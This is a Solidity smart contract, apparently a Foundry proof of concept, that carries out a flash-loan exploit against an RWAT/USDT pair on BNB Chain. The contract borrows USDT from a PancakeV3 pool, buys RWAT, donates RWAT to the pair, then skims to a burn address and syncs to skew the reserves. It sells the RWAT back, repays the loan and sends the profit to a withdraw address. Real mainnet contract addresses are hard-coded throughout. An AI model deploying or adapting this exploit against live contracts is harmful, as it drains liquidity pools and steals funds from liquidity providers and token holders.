//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions public USDT_WBNB_POOL = IUniswapV3PoolActions(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    IUniswapV2Router public constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair public constant RWAT_USDT_PAIR = IUniswapV2Pair(0x065e800b129CBA16213AcE8595979d3B1D31F061);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 public constant RWAT = ERC20(0x5367E477D3da4dF3dd0A97f020FD223B734b05F1);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        (uint256 borrowAmount, uint256 donateAmount, address burnAddress) =
            abi.decode(data, (uint256, uint256, address));

        console.log("Before buy");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", RWAT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(RWAT), USDT.balanceOf(address(this)), address(this)
        );

        console.log("After buy");
        console.log("Before donate");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", RWAT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", RWAT.balanceOf(address(this)) / 1 ether);
        console.log();

        RWAT.transfer(address(RWAT_USDT_PAIR), donateAmount);

        console.log("After donate");
        console.log("Before skim");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", RWAT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", RWAT.balanceOf(address(this)) / 1 ether);
        console.log();

        RWAT_USDT_PAIR.skim(burnAddress);
        RWAT_USDT_PAIR.sync();

        console.log("After skim");
        console.log("Before sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", RWAT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", RWAT.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(RWAT), address(USDT), RWAT.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", RWAT.balanceOf(address(RWAT_USDT_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", RWAT.balanceOf(address(this)) / 1 ether);
        console.log();

        require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function main(uint256 flashLoanAmount, uint256 donateAmount, address burnAddress, address withdrawAddress)
        public
        onlyOwner
    {
        flashLoanAmount = flashLoanAmount * 1 ether;
        donateAmount = donateAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount, donateAmount, burnAddress);

        USDT_WBNB_POOL.flash(address(this), flashLoanAmount, 0, params);

        USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

        console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}
